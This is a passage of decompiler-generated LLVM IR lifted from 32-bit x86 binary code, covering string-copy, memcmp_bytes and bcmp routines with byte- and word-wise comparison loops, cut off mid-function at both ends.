  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  %v0_8058749 = load i32, i32* @esi, align 4
  store i32 %v0_8058749, i32* %stack_var_-8, align 4
  %v4_805874a = ptrtoint i8* %tmp5 to i32
  store i32 %v4_805874a, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8058757 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_805875b = call i32 @_strlen(i8* %v4_8058757)
  %v2_805875d = add i32 %tmp, -1
  store i32 %v2_805875d, i32* %edi.global-to-local, align 4
  %v0_805875e = load i32, i32* %edx.global-to-local, align 4
  %v8_805876113 = icmp eq i32 %v0_805875e, 0
  store i32 %v0_805875e, i32* @ecx, align 4
  br i1 %v8_805876113, label %dec_label_pc_805876c, label %dec_label_pc_8058764.lr.ph

dec_label_pc_8058764.lr.ph:                       ; preds = %entry
  %v4_8058764.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8058764.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8058764

dec_label_pc_8058764:                             ; preds = %dec_label_pc_8058764.lr.ph, %dec_label_pc_8058764.dec_label_pc_8058761_crit_edge
  %v8_8058764 = phi i1 [ %v8_8058764.pre, %dec_label_pc_8058764.lr.ph ], [ %v5_8058765, %dec_label_pc_8058764.dec_label_pc_8058761_crit_edge ]
  %v4_8058764 = phi i32 [ %v4_8058764.pre, %dec_label_pc_8058764.lr.ph ], [ %v0_8058766, %dec_label_pc_8058764.dec_label_pc_8058761_crit_edge ]
  %v2_805876e14 = phi i32 [ %v2_805875d, %dec_label_pc_8058764.lr.ph ], [ %v7_8058765, %dec_label_pc_8058764.dec_label_pc_8058761_crit_edge ]
  %v0_8058764 = load i32, i32* %esi.global-to-local, align 4
  %v1_8058764 = inttoptr i32 %v0_8058764 to i8*
  %v2_8058764 = load i8, i8* %v1_8058764, align 1
  %v3_8058764 = zext i8 %v2_8058764 to i32
  %v5_8058764 = and i32 %v4_8058764, -256
  %v6_8058764 = or i32 %v5_8058764, %v3_8058764
  store i32 %v6_8058764, i32* %eax.global-to-local, align 4
  %v9_8058764 = select i1 %v8_8058764, i32 -1, i32 1
  %v10_8058764 = add i32 %v9_8058764, %v0_8058764
  store i32 %v10_8058764, i32* %esi.global-to-local, align 4
  %v3_8058765 = inttoptr i32 %v2_805876e14 to i8*
  store i8 %v2_8058764, i8* %v3_8058765, align 1
  %v4_8058765 = load i32, i32* %edi.global-to-local, align 4
  %v5_8058765 = load i1, i1* @df, align 1
  %v6_8058765 = select i1 %v5_8058765, i32 -1, i32 1
  %v7_8058765 = add i32 %v6_8058765, %v4_8058765
  store i32 %v7_8058765, i32* %edi.global-to-local, align 4
  %v0_8058766 = load i32, i32* %eax.global-to-local, align 4
  %v3_8058766 = trunc i32 %v0_8058766 to i8
  %v4_8058766 = icmp eq i8 %v3_8058766, 0
  %v1_8058768 = icmp eq i1 %v4_8058766, false
  br i1 %v1_8058768, label %dec_label_pc_8058764.dec_label_pc_8058761_crit_edge, label %dec_label_pc_805876f

dec_label_pc_8058764.dec_label_pc_8058761_crit_edge: ; preds = %dec_label_pc_8058764
  %v0_8058761.pre = load i32, i32* @ecx, align 4
  %v1_8058761 = add i32 %v0_8058761.pre, -1
  %v8_8058761 = icmp eq i32 %v1_8058761, 0
  store i32 %v1_8058761, i32* @ecx, align 4
  br i1 %v8_8058761, label %dec_label_pc_805876c, label %dec_label_pc_8058764

dec_label_pc_805876c:                             ; preds = %dec_label_pc_8058764.dec_label_pc_8058761_crit_edge, %entry
  %v2_805876e.lcssa = phi i32 [ %v2_805875d, %entry ], [ %v7_8058765, %dec_label_pc_8058764.dec_label_pc_8058761_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_805876e = inttoptr i32 %v2_805876e.lcssa to i8*
  store i8 0, i8* %v3_805876e, align 1
  %v4_805876e = load i32, i32* %edi.global-to-local, align 4
  %v5_805876e = load i1, i1* @df, align 1
  %v6_805876e = select i1 %v5_805876e, i32 -1, i32 1
  %v7_805876e = add i32 %v6_805876e, %v4_805876e
  store i32 %v7_805876e, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805876f

dec_label_pc_805876f:                             ; preds = %dec_label_pc_8058764, %dec_label_pc_805876c
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8058773 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8058773, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8058761, { 1, 0 }
  uselistorder i32 %v0_8058766, { 1, 0 }
  uselistorder i32 %v7_8058765, { 0, 2, 1 }
  uselistorder i1 %v5_8058765, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_805876f, { 1, 0 }
  uselistorder label %dec_label_pc_8058764, { 1, 0 }
}

define i32 @memcmp_bytes() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v15_8058779 = ptrtoint i32* %stack_var_-12 to i32
  %v0_805877e = load i32, i32* @eax, align 4
  store i32 %v0_805877e, i32* %stack_var_-8, align 4
  %v0_8058782 = load i32, i32* @edx, align 4
  store i32 %v0_8058782, i32* %stack_var_-12, align 4
  %v2_8058785 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_8058789

dec_label_pc_8058789:                             ; preds = %dec_label_pc_8058789, %entry
  %v0_8058790 = phi i32 [ %v1_8058790, %dec_label_pc_8058789 ], [ %v15_8058779, %entry ]
  %v0_805878f = phi i32 [ %v1_805878f, %dec_label_pc_8058789 ], [ %v2_8058785, %entry ]
  %v1_8058789 = inttoptr i32 %v0_805878f to i8*
  %v2_8058789 = load i8, i8* %v1_8058789, align 1
  %v3_8058789 = zext i8 %v2_8058789 to i32
  %v1_805878c = inttoptr i32 %v0_8058790 to i8*
  %v2_805878c = load i8, i8* %v1_805878c, align 1
  %v3_805878c = zext i8 %v2_805878c to i32
  %v1_805878f = add i32 %v0_805878f, 1
  %v1_8058790 = add i32 %v0_8058790, 1
  %v2_8058791 = sub nsw i32 %v3_8058789, %v3_805878c
  %v12_8058791 = icmp eq i32 %v2_8058791, 0
  br i1 %v12_8058791, label %dec_label_pc_8058789, label %dec_label_pc_8058795

dec_label_pc_8058795:                             ; preds = %dec_label_pc_8058789
  store i32 %v0_8058782, i32* @edx, align 4
  store i32 %v0_805877e, i32* @ecx, align 4
  ret i32 %v2_8058791

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @bcmp() local_unnamed_addr {
entry:
  %tmp149 = call i32 @__decompiler_undefined_function_0()
  %tmp150 = call i8* @__decompiler_undefined_function_1()
  %tmp151 = call i8* @__decompiler_undefined_function_1()
  %v0_805879e = load i32, i32* @ebx, align 4
  %v4_80587a2 = ptrtoint i8* %tmp151 to i32
  store i32 %v4_80587a2, i32* @ecx, align 4
  %v4_80587a6 = ptrtoint i8* %tmp150 to i32
  store i32 %v4_80587a6, i32* @ebx, align 4
  %v6_80587af = icmp ugt i32 %tmp149, 15
  br i1 %v6_80587af, label %dec_label_pc_80587cc.preheader, label %dec_label_pc_8058a2f.preheader

dec_label_pc_80587cc.preheader:                   ; preds = %entry
  %v2_80587d049 = urem i32 %v4_80587a6, 4
  %v3_80587d050 = icmp eq i32 %v2_80587d049, 0
  %v1_80587d354 = icmp eq i1 %v3_80587d050, false
  br i1 %v1_80587d354, label %dec_label_pc_80587b6, label %dec_label_pc_80587d5

dec_label_pc_80587b6:                             ; preds = %dec_label_pc_80587cc.preheader, %dec_label_pc_80587c6
  %v0_80587ca = phi i32 [ %v1_80587ca, %dec_label_pc_80587c6 ], [ %v4_80587a2, %dec_label_pc_80587cc.preheader ]
  %v0_80587cb = phi i32 [ %v1_80587cb, %dec_label_pc_80587c6 ], [ %v4_80587a6, %dec_label_pc_80587cc.preheader ]
  %stack_var_12.055 = phi i32 [ %v4_80587c6, %dec_label_pc_80587c6 ], [ %tmp149, %dec_label_pc_80587cc.preheader ]
  %v1_80587b6 = inttoptr i32 %v0_80587cb to i8*
  %v2_80587b6 = load i8, i8* %v1_80587b6, align 1
  %v3_80587b6 = zext i8 %v2_80587b6 to i32
  %v1_80587b9 = inttoptr i32 %v0_80587ca to i8*
  %v2_80587b9 = load i8, i8* %v1_80587b9, align 1
  %v3_80587b9 = zext i8 %v2_80587b9 to i32
  %v2_80587bc = sub nsw i32 %v3_80587b9, %v3_80587b6
  %v12_80587bc = icmp eq i32 %v2_80587bc, 0
  store i32 %v2_80587bc, i32* @edx, align 4
  %v1_80587c0 = icmp eq i1 %v12_80587bc, false
  br i1 %v1_80587c0, label %dec_label_pc_8058a38, label %dec_label_pc_80587c6

dec_label_pc_80587c6:                             ; preds = %dec_label_pc_80587b6
  %v4_80587c6 = add i32 %stack_var_12.055, -1
  %v1_80587ca = add i32 %v0_80587ca, 1
  store i32 %v1_80587ca, i32* @ecx, align 4
  %v1_80587cb = add i32 %v0_80587cb, 1
  store i32 %v1_80587cb, i32* @ebx, align 4
  %v2_80587d0 = urem i32 %v1_80587cb, 4
  %v3_80587d0 = icmp eq i32 %v2_80587d0, 0
  %v1_80587d3 = icmp eq i1 %v3_80587d0, false
  br i1 %v1_80587d3, label %dec_label_pc_80587b6, label %dec_label_pc_80587d5

dec_label_pc_80587d5:                             ; preds = %dec_label_pc_80587c6, %dec_label_pc_80587cc.preheader
  %v0_80588ba = phi i32 [ %v4_80587a2, %dec_label_pc_80587cc.preheader ], [ %v1_80587ca, %dec_label_pc_80587c6 ]
  %stack_var_12.0.lcssa = phi i32 [ %tmp149, %dec_label_pc_80587cc.preheader ], [ %v4_80587c6, %dec_label_pc_80587c6 ]
  %v0_8058924 = phi i32 [ %v4_80587a6, %dec_label_pc_80587cc.preheader ], [ %v1_80587cb, %dec_label_pc_80587c6 ]
  %v1_80587db = urem i32 %v0_80588ba, 4
  %v2_80587db = icmp eq i32 %v1_80587db, 0
  %v1_80587de = icmp eq i1 %v2_80587db, false
  %v2_80588a4 = udiv i32 %stack_var_12.0.lcssa, 4
  br i1 %v1_80587de, label %dec_label_pc_8058898, label %dec_label_pc_80587e4

dec_label_pc_80587e4:                             ; preds = %dec_label_pc_80587d5
  %v1_80587ed = urem i32 %v2_80588a4, 4
  %v9_80587f0 = icmp eq i32 %v1_80587ed, 1
  br i1 %v9_80587f0, label %dec_label_pc_8058824, label %dec_label_pc_80587f5

dec_label_pc_80587f5:                             ; preds = %dec_label_pc_80587e4
  %v2_80587ed = icmp eq i32 %v1_80587ed, 0
  br i1 %v2_80587ed, label %dec_label_pc_805881e, label %dec_label_pc_80587f7

dec_label_pc_80587f7:                             ; preds = %dec_label_pc_80587f5
  %v9_80587f7 = icmp eq i32 %v1_80587ed, 3
  %v1_80587fa = inttoptr i32 %v0_80588ba to i32*
  %v2_80587fa = load i32, i32* %v1_80587fa, align 4
  %v1_80587fc = inttoptr i32 %v0_8058924 to i32*
  %v2_80587fc = load i32, i32* %v1_80587fc, align 4
  br i1 %v9_80587f7, label %dec_label_pc_805880f, label %dec_label_pc_8058800

dec_label_pc_8058800:                             ; preds = %dec_label_pc_80587f7
  %v1_8058802 = add i32 %v0_80588ba, -8
  store i32 %v2_80587fc, i32* @edx, align 4
  %v1_8058807 = add i32 %v0_8058924, -8
  store i32 %v1_8058807, i32* @ebx, align 4
  %v1_805880a = add nuw nsw i32 %v2_80588a4, 2
  br label %dec_label_pc_805885f

dec_label_pc_805880f:                             ; preds = %dec_label_pc_80587f7
  %v1_8058811 = add i32 %v0_80588ba, -4
  %v1_8058814 = add i32 %v0_8058924, -4
  store i32 %v1_8058814, i32* @ebx, align 4
  %v1_8058817 = add nuw nsw i32 %v2_80588a4, 1
  br label %dec_label_pc_805884b

dec_label_pc_805881e:                             ; preds = %dec_label_pc_80587f5
  %v1_805881e = inttoptr i32 %v0_80588ba to i32*
  %v2_805881e = load i32, i32* %v1_805881e, align 4
  store i32 %v2_805881e, i32* @eax, align 4
  %v1_8058820 = inttoptr i32 %v0_8058924 to i32*
  %v2_8058820 = load i32, i32* %v1_8058820, align 4
  store i32 %v2_8058820, i32* @edx, align 4
  br label %dec_label_pc_805883d

dec_label_pc_8058824:                             ; preds = %dec_label_pc_80587e4
  %v1_8058824 = inttoptr i32 %v0_80588ba to i32*
  %v2_8058824 = load i32, i32* %v1_8058824, align 4
  %v1_8058826 = add nsw i32 %v2_80588a4, -1
  %v1_805882b = add i32 %v0_80588ba, 4
  %v1_805882e = inttoptr i32 %v0_8058924 to i32*
  %v2_805882e = load i32, i32* %v1_805882e, align 4
  %v1_8058830 = add i32 %v0_8058924, 4
  br label %dec_label_pc_8058833

dec_label_pc_8058833:                             ; preds = %dec_label_pc_8058874, %dec_label_pc_8058824
  %v0_805886f76 = phi i32 [ %v1_8058826, %dec_label_pc_8058824 ], [ %v1_805886f, %dec_label_pc_8058874 ]
  %v4_8058837 = phi i32 [ %v2_805882e, %dec_label_pc_8058824 ], [ %v3_805886a, %dec_label_pc_8058874 ]
  %v0_8058833 = phi i32 [ %v1_805882b, %dec_label_pc_8058824 ], [ %v1_8058874, %dec_label_pc_8058874 ]
  %storemerge25.in = phi i32 [ %v1_8058830, %dec_label_pc_8058824 ], [ %v1_8058877, %dec_label_pc_8058874 ]
  %stack_var_-48.0 = phi i32 [ %v2_8058824, %dec_label_pc_8058824 ], [ %v3_805885f, %dec_label_pc_8058874 ]
  store i32 %storemerge25.in, i32* @ebx, align 4
  %v1_8058833 = inttoptr i32 %v0_8058833 to i32*
  %v2_8058833 = load i32, i32* %v1_8058833, align 4
  store i32 %v2_8058833, i32* @eax, align 4
  %v1_8058835 = inttoptr i32 %storemerge25.in to i32*
  %v2_8058835 = load i32, i32* %v1_8058835, align 4
  store i32 %v2_8058835, i32* @edx, align 4
  %v15_8058837 = icmp eq i32 %stack_var_-48.0, %v4_8058837
  %v1_805883b = icmp eq i1 %v15_8058837, false
  br i1 %v1_805883b, label %dec_label_pc_8058888, label %dec_label_pc_805883d

dec_label_pc_805883d:                             ; preds = %dec_label_pc_8058833, %dec_label_pc_805881e
  %v0_805886f75 = phi i32 [ %v0_805886f76, %dec_label_pc_8058833 ], [ %v2_80588a4, %dec_label_pc_805881e ]
  %v0_8058846 = phi i32 [ %storemerge25.in, %dec_label_pc_8058833 ], [ %v0_8058924, %dec_label_pc_805881e ]
  %v1_8058840 = phi i32 [ %v2_8058835, %dec_label_pc_8058833 ], [ %v2_8058820, %dec_label_pc_805881e ]
  %v0_8058840 = phi i32 [ %v2_8058833, %dec_label_pc_8058833 ], [ %v2_805881e, %dec_label_pc_805881e ]
  %v0_805883d = phi i32 [ %v0_8058833, %dec_label_pc_8058833 ], [ %v0_80588ba, %dec_label_pc_805881e ]
  %v1_805883d = add i32 %v0_805883d, 4
  %v2_805883d = inttoptr i32 %v1_805883d to i32*
  %v3_805883d = load i32, i32* %v2_805883d, align 4
  %v12_8058840 = icmp eq i32 %v0_8058840, %v1_8058840
  %v1_8058846 = add i32 %v0_8058846, 4
  %v2_8058846 = inttoptr i32 %v1_8058846 to i32*
  %v3_8058846 = load i32, i32* %v2_8058846, align 4
  %v1_8058849 = icmp eq i1 %v12_8058840, false
  br i1 %v1_8058849, label %dec_label_pc_805888e, label %dec_label_pc_805884b

dec_label_pc_805884b:                             ; preds = %dec_label_pc_805883d, %dec_label_pc_805880f
  %v0_805886f74 = phi i32 [ %v0_805886f75, %dec_label_pc_805883d ], [ %v1_8058817, %dec_label_pc_805880f ]
  %v0_8058857 = phi i32 [ %v3_8058846, %dec_label_pc_805883d ], [ %v2_80587fc, %dec_label_pc_805880f ]
  %v0_805884e = phi i32 [ %v0_8058846, %dec_label_pc_805883d ], [ %v1_8058814, %dec_label_pc_805880f ]
  %v0_805884b = phi i32 [ %v0_805883d, %dec_label_pc_805883d ], [ %v1_8058811, %dec_label_pc_805880f ]
  %stack_var_-20.0 = phi i32 [ %v3_805883d, %dec_label_pc_805883d ], [ %v2_80587fa, %dec_label_pc_805880f ]
  %v1_805884b = add i32 %v0_805884b, 8
  %v2_805884b = inttoptr i32 %v1_805884b to i32*
  %v3_805884b = load i32, i32* %v2_805884b, align 4
  %v1_805884e = add i32 %v0_805884e, 8
  %v2_805884e = inttoptr i32 %v1_805884e to i32*
  %v3_805884e = load i32, i32* %v2_805884e, align 4
  store i32 %v3_805884e, i32* @edx, align 4
  %v15_8058851 = icmp eq i32 %stack_var_-20.0, %v0_8058857
  br i1 %v15_8058851, label %dec_label_pc_805885f, label %dec_label_pc_8058857

dec_label_pc_8058857:                             ; preds = %dec_label_pc_805884b
  store i32 %v0_8058857, i32* @edx, align 4
  store i32 %stack_var_-20.0, i32* @eax, align 4
  br label %dec_label_pc_805888e

dec_label_pc_805885f:                             ; preds = %dec_label_pc_805884b, %dec_label_pc_8058800
  %v0_805886f = phi i32 [ %v0_805886f74, %dec_label_pc_805884b ], [ %v1_805880a, %dec_label_pc_8058800 ]
  %v0_8058877 = phi i32 [ %v0_805884e, %dec_label_pc_805884b ], [ %v1_8058807, %dec_label_pc_8058800 ]
  %v1_8058862 = phi i32 [ %v3_805884e, %dec_label_pc_805884b ], [ %v2_80587fc, %dec_label_pc_8058800 ]
  %v0_8058868 = phi i32 [ %v3_805884b, %dec_label_pc_805884b ], [ %v2_80587fa, %dec_label_pc_8058800 ]
  %v0_8058874 = phi i32 [ %v0_805884b, %dec_label_pc_805884b ], [ %v1_8058802, %dec_label_pc_8058800 ]
  %v1_805885f = add i32 %v0_8058874, 12
  %v2_805885f = inttoptr i32 %v1_805885f to i32*
  %v3_805885f = load i32, i32* %v2_805885f, align 4
  %v12_8058862 = icmp eq i32 %v0_8058868, %v1_8058862
  store i32 %v0_8058868, i32* @eax, align 4
  %v1_805886a = add i32 %v0_8058877, 12
  %v2_805886a = inttoptr i32 %v1_805886a to i32*
  %v3_805886a = load i32, i32* %v2_805886a, align 4
  %v1_805886d = icmp eq i1 %v12_8058862, false
  br i1 %v1_805886d, label %dec_label_pc_805888e, label %dec_label_pc_805886f

dec_label_pc_805886f:                             ; preds = %dec_label_pc_805885f
  %v1_805886f = add i32 %v0_805886f, -4
  %v9_805886f = icmp eq i32 %v1_805886f, 0
  br i1 %v9_805886f, label %dec_label_pc_805887c, label %dec_label_pc_8058874

dec_label_pc_8058874:                             ; preds = %dec_label_pc_805886f
  %v1_8058874 = add i32 %v0_8058874, 16
  %v1_8058877 = add i32 %v0_8058877, 16
  br label %dec_label_pc_8058833

dec_label_pc_805887c:                             ; preds = %dec_label_pc_805886f
  %v15_805887e = icmp eq i32 %v3_805885f, %v3_805886a
  br i1 %v15_805887e, label %dec_label_pc_80589ff.thread, label %dec_label_pc_8058888

dec_label_pc_80589ff.thread:                      ; preds = %dec_label_pc_805887c
  br label %dec_label_pc_8058a03

dec_label_pc_8058888:                             ; preds = %dec_label_pc_805887c, %dec_label_pc_8058833
  %v0_8058888 = phi i32 [ %v4_8058837, %dec_label_pc_8058833 ], [ %v3_805886a, %dec_label_pc_805887c ]
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_8058833 ], [ %v3_805885f, %dec_label_pc_805887c ]
  store i32 %v0_8058888, i32* @edx, align 4
  store i32 %stack_var_-48.1, i32* @eax, align 4
  br label %dec_label_pc_805888e

dec_label_pc_805888e:                             ; preds = %dec_label_pc_805885f, %dec_label_pc_805883d, %dec_label_pc_8058857, %dec_label_pc_8058888
  %v0_805888e = call i32 @memcmp_bytes()
  br label %dec_label_pc_80589ff

dec_label_pc_8058898:                             ; preds = %dec_label_pc_80587d5
  %v2_80588a7 = mul nuw nsw i32 %v1_80587db, 8
  %v6_80588ae = sub nsw i32 32, %v2_80588a7
  %v1_80588bc = urem i32 %v2_80588a4, 4
  %v1_80588bf = and i32 %v0_80588ba, -4
  store i32 %v1_80588bf, i32* @edx, align 4
  %v9_80588c2 = icmp eq i32 %v1_80588bc, 1
  br i1 %v9_80588c2, label %dec_label_pc_8058912, label %dec_label_pc_80588c7

dec_label_pc_80588c7:                             ; preds = %dec_label_pc_8058898
  %v2_80588bc = icmp eq i32 %v1_80588bc, 0
  br i1 %v2_80588bc, label %dec_label_pc_8058902, label %dec_label_pc_80588c9

dec_label_pc_80588c9:                             ; preds = %dec_label_pc_80588c7
  %v9_80588c9 = icmp eq i32 %v1_80588bc, 3
  %v1_80588cc = inttoptr i32 %v1_80588bf to i32*
  %v2_80588cc = load i32, i32* %v1_80588cc, align 4
  %v1_80588ce = inttoptr i32 %v0_8058924 to i32*
  %v2_80588ce = load i32, i32* %v1_80588ce, align 4
  %v1_80588d0 = add i32 %v1_80588bf, 4
  %v2_80588d0 = inttoptr i32 %v1_80588d0 to i32*
  %v3_80588d0 = load i32, i32* %v2_80588d0, align 4
  br i1 %v9_80588c9, label %dec_label_pc_80588ef, label %dec_label_pc_805899e.thread

dec_label_pc_805899e.thread:                      ; preds = %dec_label_pc_80588c9
  %v4_80588d5 = add nuw nsw i32 %v2_80588a4, 2
  %v1_80588dc = add i32 %v1_80588bf, -4
  store i32 %v1_80588dc, i32* @edx, align 4
  %v1_80588df = add i32 %v0_8058924, -8
  store i32 %v1_80588df, i32* @ebx, align 4
  %.pre208 = and i32 %v6_80588ae, 24
  br label %bb173

dec_label_pc_80588ef:                             ; preds = %dec_label_pc_80588c9
  %v4_80588ef = add nuw nsw i32 %v2_80588a4, 1
  %v1_80588f5 = add i32 %v0_8058924, -4
  store i32 %v1_80588f5, i32* @ebx, align 4
  br label %bb168

dec_label_pc_8058902:                             ; preds = %dec_label_pc_80588c7
  %v1_8058902 = add i32 %v1_80588bf, 4
  %v2_8058902 = inttoptr i32 %v1_8058902 to i32*
  %v3_8058902 = load i32, i32* %v2_8058902, align 4
  %v1_8058905 = inttoptr i32 %v1_80588bf to i32*
  %v2_8058905 = load i32, i32* %v1_8058905, align 4
  store i32 %v1_8058902, i32* @edx, align 4
  %v1_805890e = inttoptr i32 %v0_8058924 to i32*
  %v2_805890e = load i32, i32* %v1_805890e, align 4
  br label %bb163

dec_label_pc_8058912:                             ; preds = %dec_label_pc_8058898
  %v1_8058912 = inttoptr i32 %v1_80588bf to i32*
  %v2_8058912 = load i32, i32* %v1_8058912, align 4
  %v1_8058918 = add i32 %v1_80588bf, 4
  %v2_8058918 = inttoptr i32 %v1_8058918 to i32*
  %v3_8058918 = load i32, i32* %v2_8058918, align 4
  %v1_805891b = inttoptr i32 %v0_8058924 to i32*
  %v2_805891b = load i32, i32* %v1_805891b, align 4
  %v4_805891d = add nsw i32 %v2_80588a4, -1
  %v1_8058921 = add i32 %v1_80588bf, 8
  store i32 %v1_8058921, i32* @edx, align 4
  %v1_8058924 = add i32 %v0_8058924, 4
  br label %bb158

bb158:                                            ; preds = %dec_label_pc_80589d1, %dec_label_pc_8058912
  %storemerge9.pre = phi i32 [ %v3_80589ab, %dec_label_pc_80589d1 ], [ %v2_805891b, %dec_label_pc_8058912 ]
  %v0_8058940 = phi i32 [ %v3_80589a8, %dec_label_pc_80589d1 ], [ %v3_8058918, %dec_label_pc_8058912 ]
  %v6_8058929 = phi i32 [ %v8_80589ae, %dec_label_pc_80589d1 ], [ %v0_80588ba, %dec_label_pc_8058912 ]
  %v0_8058927 = phi i32 [ %v1_80589d1, %dec_label_pc_80589d1 ], [ %v1_8058921, %dec_label_pc_8058912 ]
  %v0_8058937 = phi i32 [ %v1_80589d4, %dec_label_pc_80589d1 ], [ %v1_8058924, %dec_label_pc_8058912 ]
  %stack_var_-24.0 = phi i32 [ %v4_80589ca, %dec_label_pc_80589d1 ], [ %v4_805891d, %dec_label_pc_8058912 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.1195, %dec_label_pc_80589d1 ], [ %v2_8058912, %dec_label_pc_8058912 ]
  store i32 %v0_8058937, i32* @ebx, align 4
  %v1_8058927 = inttoptr i32 %v0_8058927 to i32*
  %v2_8058927 = load i32, i32* %v1_8058927, align 4
  %v7_8058929 = and i32 %v6_8058929, -256
  %v5_8058935 = lshr i32 %stack_var_-36.0, %v2_80588a7
  %v1_8058937 = inttoptr i32 %v0_8058937 to i32*
  %v2_8058937 = load i32, i32* %v1_8058937, align 4
  %v8_8058939 = or i32 %v7_8058929, %v6_80588ae
  %v2_8058942 = and i32 %v6_80588ae, 24
  %v4_8058942 = icmp eq i32 %v2_8058942, 0
  br i1 %v4_8058942, label %bb161, label %bb159

bb159:                                            ; preds = %bb158
  %v5_8058942 = shl i32 %v0_8058940, %v2_8058942
  br label %bb161

bb161:                                            ; preds = %bb158, %bb159
  %v3_8058944 = phi i32 [ %v0_8058940, %bb158 ], [ %v5_8058942, %bb159 ]
  %v4_8058944 = or i32 %v3_8058944, %v5_8058935
  %v14_8058947 = icmp eq i32 %v4_8058944, %storemerge9.pre
  br i1 %v14_8058947, label %bb163, label %dec_label_pc_80589c5

bb163:                                            ; preds = %bb161, %dec_label_pc_8058902
  %v1_805896c = phi i32 [ %v2_8058937, %bb161 ], [ %v2_805890e, %dec_label_pc_8058902 ]
  %v0_8058965 = phi i32 [ %v0_8058937, %bb161 ], [ %v0_8058924, %dec_label_pc_8058902 ]
  %v0_8058957 = phi i32 [ %v0_8058940, %bb161 ], [ %v2_8058905, %dec_label_pc_8058902 ]
  %v6_8058953 = phi i32 [ %v8_8058939, %bb161 ], [ %v3_8058902, %dec_label_pc_8058902 ]
  %stack_var_-28.0 = phi i32 [ %v2_8058927, %bb161 ], [ %v3_8058902, %dec_label_pc_8058902 ]
  %v0_8058950 = phi i32 [ %v0_8058927, %bb161 ], [ %v1_8058902, %dec_label_pc_8058902 ]
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %bb161 ], [ %v2_80588a4, %dec_label_pc_8058902 ]
  %v1_8058950 = add i32 %v0_8058950, 4
  %v2_8058950 = inttoptr i32 %v1_8058950 to i32*
  %v3_8058950 = load i32, i32* %v2_8058950, align 4
  %v7_8058953 = and i32 %v6_8058953, -256
  %v5_8058957 = lshr i32 %v0_8058957, %v2_80588a7
  %v8_805895d = or i32 %v7_8058953, %v6_80588ae
  %v1_8058965 = add i32 %v0_8058965, 4
  %v2_8058965 = inttoptr i32 %v1_8058965 to i32*
  %v3_8058965 = load i32, i32* %v2_8058965, align 4
  %v2_8058968 = and i32 %v6_80588ae, 24
  %v4_8058968 = icmp eq i32 %v2_8058968, 0
  br i1 %v4_8058968, label %bb166, label %bb164

bb164:                                            ; preds = %bb163
  %v5_8058968 = shl i32 %stack_var_-28.0, %v2_8058968
  br label %bb166

bb166:                                            ; preds = %bb163, %bb164
  %v1_805896a = phi i32 [ %stack_var_-28.0, %bb163 ], [ %v5_8058968, %bb164 ]
  %v2_805896a = or i32 %v1_805896a, %v5_8058957
  %v12_805896c = icmp eq i32 %v2_805896a, %v1_805896c
  br i1 %v12_805896c, label %bb168, label %dec_label_pc_805899a

bb168:                                            ; preds = %bb166, %dec_label_pc_80588ef
  %storemerge11.pre = phi i32 [ %v3_8058965, %bb166 ], [ %v2_80588ce, %dec_label_pc_80588ef ]
  %v0_8058991 = phi i32 [ %v0_8058965, %bb166 ], [ %v1_80588f5, %dec_label_pc_80588ef ]
  %v6_8058977 = phi i32 [ %v8_805895d, %bb166 ], [ %v2_80588cc, %dec_label_pc_80588ef ]
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %bb166 ], [ %v2_80588cc, %dec_label_pc_80588ef ]
  %v0_8058974 = phi i32 [ %v0_8058950, %bb166 ], [ %v1_80588bf, %dec_label_pc_80588ef ]
  %stack_var_-24.2 = phi i32 [ %stack_var_-24.1, %bb166 ], [ %v4_80588ef, %dec_label_pc_80588ef ]
  %stack_var_-32.0 = phi i32 [ %v3_8058950, %bb166 ], [ %v3_80588d0, %dec_label_pc_80588ef ]
  %v1_8058974 = add i32 %v0_8058974, 8
  %v2_8058974 = inttoptr i32 %v1_8058974 to i32*
  %v3_8058974 = load i32, i32* %v2_8058974, align 4
  %v5_8058983 = lshr i32 %stack_var_-28.1, %v2_80588a7
  %v2_805898d = and i32 %v6_80588ae, 24
  %v4_805898d = icmp eq i32 %v2_805898d, 0
  br i1 %v4_805898d, label %bb171, label %bb169

bb169:                                            ; preds = %bb168
  %v5_805898d = shl i32 %stack_var_-32.0, %v2_805898d
  br label %bb171

bb171:                                            ; preds = %bb168, %bb169
  %v1_805898f = phi i32 [ %stack_var_-32.0, %bb168 ], [ %v5_805898d, %bb169 ]
  %v2_805898f = or i32 %v1_805898f, %v5_8058983
  %v12_8058994 = icmp eq i32 %v2_805898f, %storemerge11.pre
  br i1 %v12_8058994, label %dec_label_pc_805899e, label %dec_label_pc_805899a

dec_label_pc_805899a:                             ; preds = %bb171, %bb166
  %v0_805899a = phi i32 [ %v2_805896a, %bb166 ], [ %v2_805898f, %bb171 ]
  %storemerge11 = phi i32 [ %v1_805896c, %bb166 ], [ %storemerge11.pre, %bb171 ]
  store i32 %storemerge11, i32* @edx, align 4
  store i32 %v0_805899a, i32* @eax, align 4
  br label %dec_label_pc_80589f6

dec_label_pc_805899e:                             ; preds = %bb171
  %v1_8058991 = add i32 %v0_8058991, 8
  %v2_8058991 = inttoptr i32 %v1_8058991 to i32*
  %v3_8058991 = load i32, i32* %v2_8058991, align 4
  br label %bb173

bb173:                                            ; preds = %dec_label_pc_805899e.thread, %dec_label_pc_805899e
